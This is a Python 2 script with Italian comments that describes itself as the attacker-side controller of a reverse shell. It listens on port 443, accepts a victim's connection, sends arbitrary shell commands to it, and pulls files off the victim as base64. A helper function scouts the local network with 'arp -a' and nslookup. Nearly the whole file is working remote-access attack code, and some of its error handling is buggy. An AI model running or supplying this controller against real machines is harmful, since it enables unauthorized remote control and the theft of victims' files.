# questo e' il programma che deve rimanere attivo sulla macchina dell 'attaccante
import socket,sys
import base64,os
def attacker():
    #protocollo predefinito e' di tipo TCP. e' affiidabile e consegna i dati in ordine.
    #AF_INET e' la famiglia di indirizzi internet per IPV4. SOCK_STREAM e' il tipo di socket per TCP
    sock= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #sock.connect(("192.168.1.5",443))
    sock.bind(("192.168.1.6",443)) #viene usato per associare il socket ad una itnerfaccia di rete e un numero di porta specifico
    sock.listen(2)#consente all'attacker di accettare le connessioni. Accetta fino a 2 connessioni
    print ("Listening on port 443... ")
    (client, (ip, port)) = sock.accept() #accept attende una connessione in entrata
    print (" Received connection from : ", ip)
    while True:
        try:
            command = raw_input('~$ ')
            ##invio comando exit
            if command=="exit":
                client.send(b'exit')
                client.close()
                break

            if command is b"":
                print("Please enter a command")
            #comando download
            elif command.split(" ")[0] == "download":
                file_name = command.split(" ")[1:]
                client.send(command)
                read_data = client.recv(1000000)
                print(read_data)
                file_name=str(file_name)
                decoded = base64.b64decode(read_data)
                name_file=raw_input("Nome file che vuoi usare: ")
                with open(os.path.expanduser(str(name_file)), "wb") as f:
                    f.write(decoded)

            else:
                client.send(command)
                data = client.recv(1000000)
                print(data)

        except Exception as e:
            sock.send("An error has occured: {}".format(str(e)).encode("utf-8"))
    client.close()
    sock.close()


def ricercare():
        cerco="arp" + " " + "-a"
        os.system(cerco)
        #cercare di farlo in automatico
        print("\n")
        hostname=raw_input("Scrivere IP di interesse: ")
        amplio="nslookup" + " " + hostname
        os.system(amplio)
        return hostname